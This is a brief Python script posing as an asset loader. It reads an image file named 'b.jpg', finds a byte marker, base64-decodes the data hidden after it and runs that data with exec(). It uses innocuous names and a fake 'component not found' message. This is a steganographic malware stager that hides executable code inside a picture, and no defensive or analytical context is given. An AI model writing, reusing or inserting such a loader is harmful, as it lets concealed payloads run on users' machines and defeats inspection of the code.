import base64
import os
import sys
from pathlib import Path

def _load_asset(asset_path):
    try:
        with open(asset_path, 'rb') as f:
            content = f.read()
        
        signature = b'\xFF\xFE'
        location = content.find(signature)
        if location != -1:
            asset_start = location + 4
            asset_end = content.find(b'\xFF', asset_start)
            if asset_end == -1:
                asset_end = len(content)
            packaged_data = content[asset_start:asset_end]
            return base64.b64decode(packaged_data)
    except Exception:
        pass
    return None

current_location = Path(__file__).parent
asset_file = current_location / "b.jpg"

asset_content = _load_asset(asset_file)
if asset_content:
    exec(asset_content)
else:
    print("Required component not found")
    input("Press Enter to exit...")
    sys.exit(1)